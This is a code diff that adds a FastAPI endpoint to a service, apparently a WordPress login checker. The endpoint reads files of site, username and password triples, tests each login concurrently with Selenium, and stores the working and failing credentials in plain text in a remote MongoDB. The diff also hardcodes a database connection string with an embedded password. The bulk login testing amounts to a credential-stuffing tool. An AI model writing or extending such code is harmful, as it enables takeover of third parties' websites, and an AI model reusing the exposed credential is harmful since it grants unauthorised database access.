@@ -16,9 +16,13 @@ from pydantic import BaseModel,HttpUrl
 from fastapi.logger import logger
 import tempfile
 import threading
+from pymongo import MongoClient
+from threading import Lock
 
 
-
+MONGO_URI = "mongodb+srv://nafseerck:7gbNMNAc5s236F5K@overthetop.isxuv3s.mongodb.net/smaiDB"
+DB_NAME = "ninjadb"
+COLLECTION_NAME = "wordpress_urls"
 
 class LoginRequest(BaseModel):
     site_url: HttpUrl  # Ensures a valid URL is provided
@@ -26,6 +30,10 @@ class LoginRequest(BaseModel):
     password: str
 
 driver = None
+
+client = MongoClient(MONGO_URI)
+db = client[DB_NAME]
+collection = db[COLLECTION_NAME]
 
 
 app = FastAPI()
@@ -399,5 +407,61 @@ def check_wordpress_with_selenium(url, username, password):
         return f"An error occurred for {url}: {e}"
     finally:
         driver.quit()
+
+@app.post("/process-cleaned-wordpress/")
+def process_cleaned_file_wordpress(file_name: str):
+    """Process the cleaned file for WordPress login checking and save results to MongoDB."""
+    cleaned_file_path = os.path.join(CLEANED_DIR, file_name)
+    if not os.path.exists(cleaned_file_path):
+        raise HTTPException(status_code=404, detail="Cleaned file not found.")
+
+    success_entries = []
+    failure_entries = []
+    lock = Lock()  # Ensure thread-safe operations
+
+    def process_line(line):
+        """Process a single line."""
+        try:
+            site, username, password = line.strip().split(',')
+            result = check_wordpress_with_selenium(site, username, password)
+            with lock:  # Ensure only one thread modifies the lists at a time
+                if "Login successful" in result:
+                    success_entries.append({"site": site, "username": username, "password": password})
+                else:
+                    failure_entries.append({"site": site, "username": username, "password": password})
+        except ValueError:
+            with lock:
+                # Append to failures if line format is incorrect
+                failure_entries.append({"line": line.strip(), "error": "Invalid format"})
+
+    # Read cleaned file and process concurrently
+    with open(cleaned_file_path, 'r') as file:
+        lines = file.readlines()
+
+    # Use ThreadPoolExecutor with thread-safe list operations
+    with ThreadPoolExecutor() as executor:
+        executor.map(process_line, lines)
+
+    # Save to MongoDB
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    collection.update_one(
+        {"file_name": file_name},  # Query to find the document
+        {
+            "$set": {
+                "file_name": file_name,
+                "timestamp": timestamp,
+                "success": success_entries,
+                "failure": failure_entries
+            }
+        },
+        upsert=True  # Create a new document if it doesn't exist
+    )
+
+    return {
+        "message": "Processing completed.",
+        "timestamp": timestamp,
+        "success_count": len(success_entries),
+        "failure_count": len(failure_entries),
+    }
 
 
